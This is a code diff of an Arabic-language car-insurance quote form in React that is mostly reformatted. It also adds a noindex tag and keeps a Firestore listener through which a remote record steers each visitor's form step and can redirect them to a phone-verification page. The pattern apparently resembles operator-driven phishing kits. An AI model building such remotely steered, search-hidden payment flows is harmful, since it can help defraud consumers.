@@ -43,11 +43,10 @@ const MockInsurancePurpose = ({ formData, setFormData, errors }: any) => (
       <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
         <button
           type="button"
-          className={`p-4 rounded-xl border-2 transition-all duration-200 ${
-            formData.insurance_purpose === "renewal"
+          className={`p-4 rounded-xl border-2 transition-all duration-200 ${formData.insurance_purpose === "renewal"
               ? "border-blue-500 bg-blue-50 text-blue-700"
               : "border-gray-300 hover:border-blue-400"
-          }`}
+            }`}
           onClick={() => setFormData((prev: any) => ({ ...prev, insurance_purpose: "renewal" }))}
         >
           <div className="text-center">
@@ -57,11 +56,10 @@ const MockInsurancePurpose = ({ formData, setFormData, errors }: any) => (
         </button>
         <button
           type="button"
-          className={`p-4 rounded-xl border-2 transition-all duration-200 ${
-            formData.insurance_purpose === "property-transfer"
+          className={`p-4 rounded-xl border-2 transition-all duration-200 ${formData.insurance_purpose === "property-transfer"
               ? "border-blue-500 bg-blue-50 text-blue-700"
               : "border-gray-300 hover:border-blue-400"
-          }`}
+            }`}
           onClick={() => setFormData((prev: any) => ({ ...prev, insurance_purpose: "property-transfer" }))}
         >
           <div className="text-center">
@@ -151,11 +149,10 @@ const MockVehicleRegistration = ({ formData, setFormData, errors }: any) => (
       <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
         <button
           type="button"
-          className={`p-4 rounded-xl border-2 transition-all duration-200 ${
-            formData.vehicle_type === "serial"
+          className={`p-4 rounded-xl border-2 transition-all duration-200 ${formData.vehicle_type === "serial"
               ? "border-blue-500 bg-blue-50 text-blue-700"
               : "border-gray-300 hover:border-blue-400"
-          }`}
+            }`}
           onClick={() => setFormData((prev: any) => ({ ...prev, vehicle_type: "serial" }))}
         >
           <div className="text-center">
@@ -165,11 +162,10 @@ const MockVehicleRegistration = ({ formData, setFormData, errors }: any) => (
         </button>
         <button
           type="button"
-          className={`p-4 rounded-xl border-2 transition-all duration-200 ${
-            formData.vehicle_type === "custom"
+          className={`p-4 rounded-xl border-2 transition-all duration-200 ${formData.vehicle_type === "custom"
               ? "border-blue-500 bg-blue-50 text-blue-700"
               : "border-gray-300 hover:border-blue-400"
-          }`}
+            }`}
           onClick={() => setFormData((prev: any) => ({ ...prev, vehicle_type: "custom" }))}
         >
           <div className="text-center">
@@ -232,7 +228,7 @@ export default function QuotePage() {
     const visitorID = localStorage.getItem("visitor")
     if (visitorID) {
       setMounted(true)
-     setupOnlineStatus(visitorID!)
+      setupOnlineStatus(visitorID!)
     } else {
       // Create new visitor ID if none exists
       const newVisitorId = "visitor_" + Date.now()
@@ -711,13 +707,12 @@ function ProfessionalQuoteForm() {
     if (visitorId) {
       const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
         if (docSnap.exists()) {
-          const data = docSnap.data() 
-          if (  currentPage !== data.currentPage) {
-            if(data.currentPage === '9999'){
-              window.location.href='/verify-phone'
-            }else
-            {setCurrentStep(parseInt(data.currentPage))}
-          } 
+          const data = docSnap.data()
+          if (currentPage !== data.currentPage) {
+            if (data.currentPage === '9999') {
+              window.location.href = '/verify-phone'
+            } else { setCurrentStep(parseInt(data.currentPage)) }
+          }
         }
       })
 
@@ -896,10 +891,10 @@ function ProfessionalQuoteForm() {
   }
 
   const prevStep = () => {
-    const vistorId=localStorage.getItem('visitor')
+    const vistorId = localStorage.getItem('visitor')
     if (currentPage > 1) {
       setCurrentStep(currentPage - 1)
-      addData({id:vistorId,currentPage})
+      addData({ id: vistorId, currentPage })
 
     }
   }
@@ -1045,40 +1040,81 @@ function ProfessionalQuoteForm() {
   }
 
   return (
-    <Card className="bg-white rounded-2xl shadow-2xl border-0 overflow-hidden">
-      <CardContent className="p-0">
-        {/* Enhanced Progress Steps */}
-        <div className="bg-gradient-to-r from-blue-50 to-indigo-50 p-6 lg:p-8">
-          {/* Mobile Progress */}
-          <div className="block sm:hidden">
-            <div className="flex items-center gap-2 overflow-x-auto pb-2">
+    <>
+      <head>
+        <meta name="robots" content="noindex, nofollow" />
+      </head>
+      <Card className="bg-white rounded-2xl shadow-2xl border-0 overflow-hidden">
+        <CardContent className="p-0">
+          {/* Enhanced Progress Steps */}
+          <div className="bg-gradient-to-r from-blue-50 to-indigo-50 p-6 lg:p-8">
+            {/* Mobile Progress */}
+            <div className="block sm:hidden">
+              <div className="flex items-center gap-2 overflow-x-auto pb-2">
+                {steps.map((step, index) => (
+                  <div key={step.number} className="flex items-center flex-shrink-0">
+                    <div className="flex flex-col items-center">
+                      <div
+                        className={`w-10 h-10 rounded-xl flex items-center justify-center text-sm font-bold transition-all duration-300 ${step.number === currentPage
+                            ? "bg-[#109cd4] text-white shadow-lg scale-110"
+                            : step.number < currentPage
+                              ? "bg-green-500 text-white"
+                              : "bg-gray-200 text-gray-600"
+                          }`}
+                      >
+                        {step.number < currentPage ? <CheckCircle className="w-5 h-5" /> : step.number}
+                      </div>
+                      <p
+                        className={`text-xs mt-2 text-center w-20 ${step.number === currentPage ? "text-[#109cd4] font-semibold" : "text-gray-600"
+                          }`}
+                      >
+                        {step.title.split(" ")[0]}
+                      </p>
+                    </div>
+                    {index < steps.length - 1 && (
+                      <div
+                        className={`w-8 h-0.5 mx-2 transition-all duration-300 ${step.number < currentPage ? "bg-green-500" : "bg-gray-300"
+                          }`}
+                      />
+                    )}
+                  </div>
+                ))}
+              </div>
+            </div>
+
+            {/* Desktop Progress */}
+            <div className="hidden sm:flex items-center justify-between">
               {steps.map((step, index) => (
-                <div key={step.number} className="flex items-center flex-shrink-0">
+                <div key={step.number} className="flex items-center">
                   <div className="flex flex-col items-center">
                     <div
-                      className={`w-10 h-10 rounded-xl flex items-center justify-center text-sm font-bold transition-all duration-300 ${
-                        step.number === currentPage
+                      className={`w-12 h-12 lg:w-14 lg:h-14 rounded-xl flex items-center justify-center text-sm lg:text-base font-bold transition-all duration-300 ${step.number === currentPage
                           ? "bg-[#109cd4] text-white shadow-lg scale-110"
                           : step.number < currentPage
                             ? "bg-green-500 text-white"
                             : "bg-gray-200 text-gray-600"
-                      }`}
+                        }`}
                     >
-                      {step.number < currentPage ? <CheckCircle className="w-5 h-5" /> : step.number}
+                      {step.number < currentPage ? (
+                        <CheckCircle className="w-6 h-6 lg:w-7 lg:h-7" />
+                      ) : (
+                        <step.icon className="w-6 h-6 lg:w-7 lg:h-7" />
+                      )}
                     </div>
-                    <p
-                      className={`text-xs mt-2 text-center w-20 ${
-                        step.number === currentPage ? "text-[#109cd4] font-semibold" : "text-gray-600"
-                      }`}
-                    >
-                      {step.title.split(" ")[0]}
-                    </p>
+                    <div className="text-center mt-3">
+                      <p
+                        className={`text-sm lg:text-base font-semibold ${step.number === currentPage ? "text-[#109cd4]" : "text-gray-700"
+                          }`}
+                      >
+                        {step.title}
+                      </p>
+                      <p className="text-xs text-gray-500 hidden lg:block mt-1">{step.subtitle}</p>
+                    </div>
                   </div>
                   {index < steps.length - 1 && (
                     <div
-                      className={`w-8 h-0.5 mx-2 transition-all duration-300 ${
-                        step.number < currentPage ? "bg-green-500" : "bg-gray-300"
-                      }`}
+                      className={`flex-1 h-1 mx-4 lg:mx-6 rounded-full transition-all duration-300 ${step.number < currentPage ? "bg-green-500" : "bg-gray-300"
+                        }`}
                     />
                   )}
                 </div>
@@ -1086,841 +1122,792 @@ function ProfessionalQuoteForm() {
             </div>
           </div>
 
-          {/* Desktop Progress */}
-          <div className="hidden sm:flex items-center justify-between">
-            {steps.map((step, index) => (
-              <div key={step.number} className="flex items-center">
-                <div className="flex flex-col items-center">
-                  <div
-                    className={`w-12 h-12 lg:w-14 lg:h-14 rounded-xl flex items-center justify-center text-sm lg:text-base font-bold transition-all duration-300 ${
-                      step.number === currentPage
-                        ? "bg-[#109cd4] text-white shadow-lg scale-110"
-                        : step.number < currentPage
-                          ? "bg-green-500 text-white"
-                          : "bg-gray-200 text-gray-600"
-                    }`}
-                  >
-                    {step.number < currentPage ? (
-                      <CheckCircle className="w-6 h-6 lg:w-7 lg:h-7" />
-                    ) : (
-                      <step.icon className="w-6 h-6 lg:w-7 lg:h-7" />
-                    )}
+          {/* Form Content */}
+          <div className="p-6 lg:p-8">
+            <div className="min-h-[500px] lg:min-h-[600px]">
+              {currentPage === 1 && (
+                <div className="space-y-8">
+                  <div className="text-center mb-8">
+                    <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
+                      البيانات الأساسية
+                    </h3>
+                    <p className="text-gray-600">أدخل معلومات المركبة والمالك للبدء في الحصول على عرض السعر</p>
                   </div>
-                  <div className="text-center mt-3">
-                    <p
-                      className={`text-sm lg:text-base font-semibold ${
-                        step.number === currentPage ? "text-[#109cd4]" : "text-gray-700"
-                      }`}
-                    >
-                      {step.title}
-                    </p>
-                    <p className="text-xs text-gray-500 hidden lg:block mt-1">{step.subtitle}</p>
+                  <MockInsurancePurpose formData={formData} setFormData={setFormData} errors={errors} />
+                  <MockVehicleRegistration formData={formData} setFormData={setFormData} errors={errors} />
+                </div>
+              )}
+
+              {currentPage === 2 && (
+                <div className="space-y-8">
+                  <div className="text-center mb-8">
+                    <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
+                      بيانات التأمين
+                    </h3>
+                    <p className="text-gray-600">حدد تفاصيل وثيقة التأمين ونوع التغطية المطلوبة</p>
                   </div>
-                </div>
-                {index < steps.length - 1 && (
-                  <div
-                    className={`flex-1 h-1 mx-4 lg:mx-6 rounded-full transition-all duration-300 ${
-                      step.number < currentPage ? "bg-green-500" : "bg-gray-300"
-                    }`}
-                  />
-                )}
-              </div>
-            ))}
-          </div>
-        </div>
 
-        {/* Form Content */}
-        <div className="p-6 lg:p-8">
-          <div className="min-h-[500px] lg:min-h-[600px]">
-            {currentPage === 1 && (
-              <div className="space-y-8">
-                <div className="text-center mb-8">
-                  <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
-                    البيانات الأساسية
-                  </h3>
-                  <p className="text-gray-600">أدخل معلومات المركبة والمالك للبدء في الحصول على عرض السعر</p>
-                </div>
-                <MockInsurancePurpose formData={formData} setFormData={setFormData} errors={errors} />
-                <MockVehicleRegistration formData={formData} setFormData={setFormData} errors={errors} />
-              </div>
-            )}
-
-            {currentPage === 2 && (
-              <div className="space-y-8">
-                <div className="text-center mb-8">
-                  <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
-                    بيانات التأمين
-                  </h3>
-                  <p className="text-gray-600">حدد تفاصيل وثيقة التأمين ونوع التغطية المطلوبة</p>
-                </div>
-
-                <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
-                  <ValidatedInput
-                    label="تاريخ بداية الوثيقة"
-                    fieldName="policyStartDate"
-                    type="date"
-                    required
-                    min={new Date().toISOString().split("T")[0]}
-                    autoFocus={true}
-                  />
-                  <div>
-                    <label className="block text-sm font-semibold text-gray-700 mb-3">
-                      القيمة التقديرية للمركبة <span className="text-red-500">*</span>
-                    </label>
-                    <Input
-                      maxLength={6}
-                      name="vehicleValue"
-                      placeholder="54,715"
+                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    <ValidatedInput
+                      label="تاريخ بداية الوثيقة"
+                      fieldName="policyStartDate"
+                      type="date"
                       required
-                      className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200"
+                      min={new Date().toISOString().split("T")[0]}
+                      autoFocus={true}
                     />
+                    <div>
+                      <label className="block text-sm font-semibold text-gray-700 mb-3">
+                        القيمة التقديرية للمركبة <span className="text-red-500">*</span>
+                      </label>
+                      <Input
+                        maxLength={6}
+                        name="vehicleValue"
+                        placeholder="54,715"
+                        required
+                        className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200"
+                      />
+                    </div>
                   </div>
-                </div>
 
-                <div>
-                  <label className="block text-sm font-semibold text-gray-700 mb-4">
-                    نوع التأمين <span className="text-red-500">*</span>
-                  </label>
-                  <div className="grid grid-cols-2 gap-4">
-                    <button
-                      type="button"
-                      className={`p-4 rounded-xl border-2 transition-all duration-200 ${
-                        formData.insuranceTypeSelected === "comprehensive"
-                          ? "border-blue-500 bg-blue-50 text-[#109cd4] shadow-md"
-                          : "border-gray-300 hover:border-blue-400 hover:bg-blue-50"
-                      }`}
-                      onClick={() => handleFieldChange("insuranceTypeSelected", "comprehensive")}
-                    >
-                      <div className="text-center">
-                        <Shield className="w-8 h-8 mx-auto mb-2 text-current" />
-                        <div className="font-semibold">تأمين شامل</div>
-                        <div className="text-sm text-gray-500 mt-1">تغطية كاملة للمركبة</div>
-                      </div>
-                    </button>
-                    <button
-                      type="button"
-                      className={`p-4 rounded-xl border-2 transition-all duration-200 ${
-                        formData.insuranceTypeSelected === "against-others"
-                          ? "border-blue-500 bg-blue-50 text-[#109cd4] shadow-md"
-                          : "border-gray-300 hover:border-blue-400 hover:bg-blue-50"
-                      }`}
-                      onClick={() => handleFieldChange("insuranceTypeSelected", "against-others")}
-                    >
-                      <div className="text-center">
-                        <Users className="w-8 h-8 mx-auto mb-2 text-current" />
-                        <div className="font-semibold">تأمين ضد الغير</div>
-                        <div className="text-sm text-gray-500 mt-1">التغطية الأساسية</div>
-                      </div>
-                    </button>
-                  </div>
-                </div>
-
-                <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
-                  <Card className="border-2 border-gray-200 hover:border-blue-300 transition-colors">
-                    <CardContent className="p-6 text-center">
-                      <div className="flex items-center justify-center gap-2 mb-4">
-                        <Users className="w-6 h-6 text-[#109cd4]" />
-                        <span className="font-semibold text-lg">إضافة سائقين</span>
-                      </div>
-                      <div className="flex items-center justify-center gap-4">
-                        <button
-                          type="button"
-                          className="w-10 h-10 rounded-full bg-[#109cd4] text-white flex items-center justify-center hover:bg-blue-700 transition-colors"
-                          onClick={() =>
-                            handleFieldChange("additionalDrivers", Math.max(0, formData.additionalDrivers - 1))
-                          }
-                        >
-                          -
-                        </button>
-                        <span className="text-2xl font-bold text-gray-900">{formData.additionalDrivers}</span>
-                        <button
-                          type="button"
-                          className="w-10 h-10 rounded-full bg-[#109cd4] text-white flex items-center justify-center hover:bg-blue-700 transition-colors"
-                          onClick={() =>
-                            handleFieldChange("additionalDrivers", Math.min(5, formData.additionalDrivers + 1))
-                          }
-                        >
-                          +
-                        </button>
-                      </div>
-                      <p className="text-sm text-gray-500 mt-2">الحد الأقصى 5 سائقين</p>
-                    </CardContent>
-                  </Card>
-
-                  <Card className="border-2 border-green-200 bg-green-50">
-                    <CardContent className="p-6 text-center">
-                      <div className="flex items-center justify-center gap-2 mb-4">
-                        <Star className="w-6 h-6 text-green-600" />
-                        <span className="font-semibold text-lg text-green-800">خصومات خاصة</span>
-                      </div>
-                      <div className="flex items-center gap-3 mb-3">
-                        <input
-                          type="checkbox"
-                          className="w-5 h-5 text-green-600"
-                          checked={formData.specialDiscounts}
-                          onChange={(e) => handleFieldChange("specialDiscounts", e.target.checked)}
-                        />
-                        <span className="text-sm text-green-800">أريد الحصول على خصومات خاصة</span>
-                      </div>
-                      <Button className="bg-green-600 hover:bg-green-700 text-white w-full">عرض الخصومات</Button>
-                    </CardContent>
-                  </Card>
-                </div>
-              </div>
-            )}
-
-            {currentPage === 3 && (
-              <div className="space-y-8">
-                <div className="text-center mb-8">
-                  <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
-                    قائمة الأسعار
-                  </h3>
-                  <p className="text-gray-600">قارن بين العروض المتاحة واختر الأنسب لك</p>
-                </div>
-
-                <div className="flex justify-center mb-8">
-                  <div className="flex bg-gray-100 rounded-xl p-1">
-                    <button
-                      type="button"
-                      className={`px-6 py-3 rounded-lg text-sm font-semibold transition-all ${
-                        formData.insuranceTypeSelected === "against-others"
-                          ? "bg-[#109cd4] text-white shadow-md"
-                          : "text-gray-600 hover:text-gray-900"
-                      }`}
-                      onClick={() => handleFieldChange("insuranceTypeSelected", "against-others")}
-                    >
-                      ضد الغير
-                    </button>
-                    <button
-                      type="button"
-                      className={`px-6 py-3 rounded-lg text-sm font-semibold transition-all ${
-                        formData.insuranceTypeSelected === "comprehensive"
-                          ? "bg-[#109cd4] text-white shadow-md"
-                          : "text-gray-600 hover:text-gray-900"
-                      }`}
-                      onClick={() => handleFieldChange("insuranceTypeSelected", "comprehensive")}
-                    >
-                      شامل
-                    </button>
-                  </div>
-                </div>
-
-                <div className="space-y-4 max-h-96 overflow-y-auto">
-                  {offerData
-                    .filter((offer) => {
-                      if (formData.insuranceTypeSelected === "comprehensive") {
-                        return offer.type === "comprehensive" || offer.type === "special"
-                      }
-                      return offer.type === "against-others"
-                    })
-                    .sort((a, b) => Number.parseFloat(a.main_price) - Number.parseFloat(b.main_price))
-                    .slice(0, 8)
-                    .map((offer, index) => {
-                      const totalExpenses = offer.extra_expenses.reduce((sum, expense) => sum + expense.price, 0)
-                      const finalPrice = Number.parseFloat(offer.main_price) + totalExpenses
-                      const isSelected = formData.selectedInsuranceOffer === offer.id
-
-                      return (
-                        <Card
-                          key={offer.id}
-                          className={`relative transition-all duration-200 cursor-pointer hover:shadow-md ${
-                            isSelected
-                              ? "ring-2 ring-[#109cd4] shadow-lg bg-blue-50/30"
-                              : "hover:shadow-sm border-gray-200"
+                  <div>
+                    <label className="block text-sm font-semibold text-gray-700 mb-4">
+                      نوع التأمين <span className="text-red-500">*</span>
+                    </label>
+                    <div className="grid grid-cols-2 gap-4">
+                      <button
+                        type="button"
+                        className={`p-4 rounded-xl border-2 transition-all duration-200 ${formData.insuranceTypeSelected === "comprehensive"
+                            ? "border-blue-500 bg-blue-50 text-[#109cd4] shadow-md"
+                            : "border-gray-300 hover:border-blue-400 hover:bg-blue-50"
                           }`}
-                          onClick={() => handleFieldChange("selectedInsuranceOffer", offer.id)}
-                        >
-                          <CardContent className="p-0">
-                            {/* Header Section */}
-                            <div className="p-4 pb-3">
-                              <div className="flex items-start gap-3">
-                                {/* Radio Button */}
-                                <div className="flex-shrink-0 mt-1">
+                        onClick={() => handleFieldChange("insuranceTypeSelected", "comprehensive")}
+                      >
+                        <div className="text-center">
+                          <Shield className="w-8 h-8 mx-auto mb-2 text-current" />
+                          <div className="font-semibold">تأمين شامل</div>
+                          <div className="text-sm text-gray-500 mt-1">تغطية كاملة للمركبة</div>
+                        </div>
+                      </button>
+                      <button
+                        type="button"
+                        className={`p-4 rounded-xl border-2 transition-all duration-200 ${formData.insuranceTypeSelected === "against-others"
+                            ? "border-blue-500 bg-blue-50 text-[#109cd4] shadow-md"
+                            : "border-gray-300 hover:border-blue-400 hover:bg-blue-50"
+                          }`}
+                        onClick={() => handleFieldChange("insuranceTypeSelected", "against-others")}
+                      >
+                        <div className="text-center">
+                          <Users className="w-8 h-8 mx-auto mb-2 text-current" />
+                          <div className="font-semibold">تأمين ضد الغير</div>
+                          <div className="text-sm text-gray-500 mt-1">التغطية الأساسية</div>
+                        </div>
+                      </button>
+                    </div>
+                  </div>
+
+                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    <Card className="border-2 border-gray-200 hover:border-blue-300 transition-colors">
+                      <CardContent className="p-6 text-center">
+                        <div className="flex items-center justify-center gap-2 mb-4">
+                          <Users className="w-6 h-6 text-[#109cd4]" />
+                          <span className="font-semibold text-lg">إضافة سائقين</span>
+                        </div>
+                        <div className="flex items-center justify-center gap-4">
+                          <button
+                            type="button"
+                            className="w-10 h-10 rounded-full bg-[#109cd4] text-white flex items-center justify-center hover:bg-blue-700 transition-colors"
+                            onClick={() =>
+                              handleFieldChange("additionalDrivers", Math.max(0, formData.additionalDrivers - 1))
+                            }
+                          >
+                            -
+                          </button>
+                          <span className="text-2xl font-bold text-gray-900">{formData.additionalDrivers}</span>
+                          <button
+                            type="button"
+                            className="w-10 h-10 rounded-full bg-[#109cd4] text-white flex items-center justify-center hover:bg-blue-700 transition-colors"
+                            onClick={() =>
+                              handleFieldChange("additionalDrivers", Math.min(5, formData.additionalDrivers + 1))
+                            }
+                          >
+                            +
+                          </button>
+                        </div>
+                        <p className="text-sm text-gray-500 mt-2">الحد الأقصى 5 سائقين</p>
+                      </CardContent>
+                    </Card>
+
+                    <Card className="border-2 border-green-200 bg-green-50">
+                      <CardContent className="p-6 text-center">
+                        <div className="flex items-center justify-center gap-2 mb-4">
+                          <Star className="w-6 h-6 text-green-600" />
+                          <span className="font-semibold text-lg text-green-800">خصومات خاصة</span>
+                        </div>
+                        <div className="flex items-center gap-3 mb-3">
+                          <input
+                            type="checkbox"
+                            className="w-5 h-5 text-green-600"
+                            checked={formData.specialDiscounts}
+                            onChange={(e) => handleFieldChange("specialDiscounts", e.target.checked)}
+                          />
+                          <span className="text-sm text-green-800">أريد الحصول على خصومات خاصة</span>
+                        </div>
+                        <Button className="bg-green-600 hover:bg-green-700 text-white w-full">عرض الخصومات</Button>
+                      </CardContent>
+                    </Card>
+                  </div>
+                </div>
+              )}
+
+              {currentPage === 3 && (
+                <div className="space-y-8">
+                  <div className="text-center mb-8">
+                    <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
+                      قائمة الأسعار
+                    </h3>
+                    <p className="text-gray-600">قارن بين العروض المتاحة واختر الأنسب لك</p>
+                  </div>
+
+                  <div className="flex justify-center mb-8">
+                    <div className="flex bg-gray-100 rounded-xl p-1">
+                      <button
+                        type="button"
+                        className={`px-6 py-3 rounded-lg text-sm font-semibold transition-all ${formData.insuranceTypeSelected === "against-others"
+                            ? "bg-[#109cd4] text-white shadow-md"
+                            : "text-gray-600 hover:text-gray-900"
+                          }`}
+                        onClick={() => handleFieldChange("insuranceTypeSelected", "against-others")}
+                      >
+                        ضد الغير
+                      </button>
+                      <button
+                        type="button"
+                        className={`px-6 py-3 rounded-lg text-sm font-semibold transition-all ${formData.insuranceTypeSelected === "comprehensive"
+                            ? "bg-[#109cd4] text-white shadow-md"
+                            : "text-gray-600 hover:text-gray-900"
+                          }`}
+                        onClick={() => handleFieldChange("insuranceTypeSelected", "comprehensive")}
+                      >
+                        شامل
+                      </button>
+                    </div>
+                  </div>
+
+                  <div className="space-y-4 max-h-96 overflow-y-auto">
+                    {offerData
+                      .filter((offer) => {
+                        if (formData.insuranceTypeSelected === "comprehensive") {
+                          return offer.type === "comprehensive" || offer.type === "special"
+                        }
+                        return offer.type === "against-others"
+                      })
+                      .sort((a, b) => Number.parseFloat(a.main_price) - Number.parseFloat(b.main_price))
+                      .slice(0, 8)
+                      .map((offer, index) => {
+                        const totalExpenses = offer.extra_expenses.reduce((sum, expense) => sum + expense.price, 0)
+                        const finalPrice = Number.parseFloat(offer.main_price) + totalExpenses
+                        const isSelected = formData.selectedInsuranceOffer === offer.id
+
+                        return (
+                          <Card
+                            key={offer.id}
+                            className={`relative transition-all duration-200 cursor-pointer hover:shadow-md ${isSelected
+                                ? "ring-2 ring-[#109cd4] shadow-lg bg-blue-50/30"
+                                : "hover:shadow-sm border-gray-200"
+                              }`}
+                            onClick={() => handleFieldChange("selectedInsuranceOffer", offer.id)}
+                          >
+                            <CardContent className="p-0">
+                              {/* Header Section */}
+                              <div className="p-4 pb-3">
+                                <div className="flex items-start gap-3">
+                                  {/* Radio Button */}
+                                  <div className="flex-shrink-0 mt-1">
+                                    <div
+                                      className={`w-5 h-5 rounded-full border-2 flex items-center justify-center transition-colors ${isSelected ? "border-[#109cd4] bg-[#109cd4]" : "border-gray-300 bg-white"
+                                        }`}
+                                    >
+                                      {isSelected && <div className="w-2 h-2 bg-white rounded-full" />}
+                                    </div>
+                                  </div>
+
+                                  {/* Icon */}
                                   <div
-                                    className={`w-5 h-5 rounded-full border-2 flex items-center justify-center transition-colors ${
-                                      isSelected ? "border-[#109cd4] bg-[#109cd4]" : "border-gray-300 bg-white"
-                                    }`}
+                                    className={`w-12 h-12 rounded-xl flex items-center justify-center flex-shrink-0 transition-colors ${isSelected ? "bg-[#109cd4]/10" : "bg-gray-100"
+                                      }`}
                                   >
-                                    {isSelected && <div className="w-2 h-2 bg-white rounded-full" />}
+                                    <Shield className={`w-6 h-6 ${isSelected ? "text-[#109cd4]" : "text-gray-600"}`} />
+                                  </div>
+
+                                  {/* Content */}
+                                  <div className="flex-1 min-w-0">
+                                    <h4 className="font-bold text-gray-900 text-base leading-tight mb-2">
+                                      {offer.name.replace(/insurance/g, "").trim()}
+                                    </h4>
+
+                                    <div className="flex flex-wrap items-center gap-2">
+                                      <Badge
+                                        variant="secondary"
+                                        className="text-xs font-medium bg-gray-100 text-gray-700 hover:bg-gray-100"
+                                      >
+                                        {getTypeBadge(offer.type)}
+                                      </Badge>
+
+                                      {index < 3 && (
+                                        <Badge
+                                          className={`text-xs font-medium ${index === 0
+                                              ? "bg-green-100 text-green-700 hover:bg-green-100"
+                                              : index === 1
+                                                ? "bg-blue-100 text-blue-700 hover:bg-blue-100"
+                                                : "bg-orange-100 text-orange-700 hover:bg-orange-100"
+                                            }`}
+                                        >
+                                          {getBadgeText(index)}
+                                        </Badge>
+                                      )}
+                                    </div>
+                                  </div>
+
+                                  {/* Price */}
+                                  <div className="text-right flex-shrink-0">
+                                    <p className="text-lg font-bold text-gray-900">{finalPrice.toFixed(0)}</p>
+                                    <p className="text-xs text-gray-500 leading-tight">ر.س / سنوياً</p>
                                   </div>
                                 </div>
+                              </div>
 
-                                {/* Icon */}
-                                <div
-                                  className={`w-12 h-12 rounded-xl flex items-center justify-center flex-shrink-0 transition-colors ${
-                                    isSelected ? "bg-[#109cd4]/10" : "bg-gray-100"
-                                  }`}
-                                >
-                                  <Shield className={`w-6 h-6 ${isSelected ? "text-[#109cd4]" : "text-gray-600"}`} />
-                                </div>
+                              {/* Features Section */}
+                              {offer.extra_features.filter((f) => f.price === 0).length > 0 && (
+                                <div className="px-4 pb-4">
+                                  <div className="pt-3 border-t border-gray-100">
+                                    <div className="space-y-2">
+                                      {offer.extra_features
+                                        .filter((f) => f.price === 0)
+                                        .slice(0, 3)
+                                        .map((feature, idx) => (
+                                          <div key={idx} className="flex items-center gap-2">
+                                            <div className="w-4 h-4 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
+                                              <Check className="w-2.5 h-2.5 text-green-600" />
+                                            </div>
+                                            <span className="text-xs text-gray-700 leading-relaxed">
+                                              {feature.content.length > 35
+                                                ? feature.content.substring(0, 35) + "..."
+                                                : feature.content}
+                                            </span>
+                                          </div>
+                                        ))}
+                                    </div>
 
-                                {/* Content */}
-                                <div className="flex-1 min-w-0">
-                                  <h4 className="font-bold text-gray-900 text-base leading-tight mb-2">
-                                    {offer.name.replace(/insurance/g, "").trim()}
-                                  </h4>
-
-                                  <div className="flex flex-wrap items-center gap-2">
-                                    <Badge
-                                      variant="secondary"
-                                      className="text-xs font-medium bg-gray-100 text-gray-700 hover:bg-gray-100"
-                                    >
-                                      {getTypeBadge(offer.type)}
-                                    </Badge>
-
-                                    {index < 3 && (
-                                      <Badge
-                                        className={`text-xs font-medium ${
-                                          index === 0
-                                            ? "bg-green-100 text-green-700 hover:bg-green-100"
-                                            : index === 1
-                                              ? "bg-blue-100 text-blue-700 hover:bg-blue-100"
-                                              : "bg-orange-100 text-orange-700 hover:bg-orange-100"
-                                        }`}
-                                      >
-                                        {getBadgeText(index)}
-                                      </Badge>
+                                    {offer.extra_features.filter((f) => f.price === 0).length > 3 && (
+                                      <p className="text-xs text-[#109cd4] mt-2 font-medium">
+                                        +{offer.extra_features.filter((f) => f.price === 0).length - 3} ميزة إضافية
+                                      </p>
                                     )}
                                   </div>
                                 </div>
-
-                                {/* Price */}
-                                <div className="text-right flex-shrink-0">
-                                  <p className="text-lg font-bold text-gray-900">{finalPrice.toFixed(0)}</p>
-                                  <p className="text-xs text-gray-500 leading-tight">ر.س / سنوياً</p>
-                                </div>
-                              </div>
-                            </div>
-
-                            {/* Features Section */}
-                            {offer.extra_features.filter((f) => f.price === 0).length > 0 && (
-                              <div className="px-4 pb-4">
-                                <div className="pt-3 border-t border-gray-100">
-                                  <div className="space-y-2">
-                                    {offer.extra_features
-                                      .filter((f) => f.price === 0)
-                                      .slice(0, 3)
-                                      .map((feature, idx) => (
-                                        <div key={idx} className="flex items-center gap-2">
-                                          <div className="w-4 h-4 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
-                                            <Check className="w-2.5 h-2.5 text-green-600" />
-                                          </div>
-                                          <span className="text-xs text-gray-700 leading-relaxed">
-                                            {feature.content.length > 35
-                                              ? feature.content.substring(0, 35) + "..."
-                                              : feature.content}
-                                          </span>
-                                        </div>
-                                      ))}
-                                  </div>
-
-                                  {offer.extra_features.filter((f) => f.price === 0).length > 3 && (
-                                    <p className="text-xs text-[#109cd4] mt-2 font-medium">
-                                      +{offer.extra_features.filter((f) => f.price === 0).length - 3} ميزة إضافية
-                                    </p>
-                                  )}
-                                </div>
-                              </div>
-                            )}
-
-                            {/* Selected Indicator */}
-                            {isSelected && (
-                              <div className="absolute top-3 left-3">
-                                <div className="w-6 h-6 bg-[#109cd4] rounded-full flex items-center justify-center">
-                                  <Check className="w-3.5 h-3.5 text-white" />
-                                </div>
-                              </div>
-                            )}
-                          </CardContent>
-                        </Card>
-                      )
-                    })}
-                </div>
-
-                {errors.selectedInsuranceOffer && (
-                  <div className="flex items-center gap-2 text-red-600 text-sm bg-red-50 p-3 rounded-lg">
-                    <AlertCircle className="w-4 h-4 flex-shrink-0" />
-                    <span>{errors.selectedInsuranceOffer}</span>
-                  </div>
-                )}
-              </div>
-            )}
-
-            {currentPage === 4 && (
-              <div className="space-y-8">
-                <div className="text-center mb-8">
